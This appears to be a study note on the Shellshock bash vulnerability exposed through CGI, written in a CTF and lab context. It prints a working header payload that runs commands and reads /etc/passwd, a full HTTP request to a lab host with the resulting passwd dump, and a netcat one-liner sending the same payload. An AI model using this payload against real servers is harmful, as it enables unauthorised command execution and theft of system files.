This vulnerability impacts the BASH shell. Bash can be exposed through a __Common Gateway Interface__, aka __CGI__

For this to work we need to find a CGI using shell. Thatâ€™s very rare nowadays.

[How CGI works](CGI.md)

The exploit is fairly simple. The root of the issue is that bash can have so called __internal function declarations__ inside of ENV variables. This makes us be able to run commands, because we can run arbitrary commands after a function declaration.

So what we have to do is define an empty function, and after that we can run commands like so:

```bash

() { :;}; echo $(</etc/passwd)
```

Here, the `()` is the function body, the `{ :;}` is the empty function. and then we have basically `cat` with `echo`. 

```ad-hint
This can actually be used in CTFs or in systems where echo is restricted but you have access to bash. For example in PicoCTF2023 this could be used in Specialer. 

[My writeup for that](https://0x50d4.github.io/blog/posts/pico-specialer/)
```


> GET /cgi-bin/status HTTP/1.1
Host: ptl-c56c549cb256-c38c7e5679a9.libcurl.me
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: test
test: () { :;}; echo $(</etc/passwd)
X-Requested-With: XMLHttpRequest
Referer: hxxp://ptl-c56c549cb256-c38c7e5679a9.libcurl.me/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Here is an example request and the response:

> HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 30 Jul 2023 14:44:44 GMT
Content-Type: application/json
Connection: close
root: x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin: x:2:2:bin:/bin:/usr/sbin/nologin
sys: x:3:3:sys:/dev:/usr/sbin/nologin
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/usr/sbin/nologin
man: x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp: x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail: x:8:8:mail:/var/mail:/usr/sbin/nologin
news: x:9:9:news::/var/spool/news:/usr/sbin/nologin
uucp: x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy: x:13:13:proxy::/bin:/usr/sbin/nologin
www-data: x:33:33:www-data:/var/www:/usr/sbin/nologin
backup: x:34:34:backup:/var/backups:/usr/sbin/nologin
list: x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc: x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody: x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync: x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network: x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve: x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy: x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Content-Length: 188
>
{ "uptime": " 14:44:44 up 79 days, 16:53, 0 users, load average: 0.00, 0.00, 0.00", "kernel": "Linux b8cbde3bfa41 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux"}

This payload could also be just put into a text format like so:

```swift
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```

Now, we can use a bind shell or a reverse shell to get access to a bash command line.






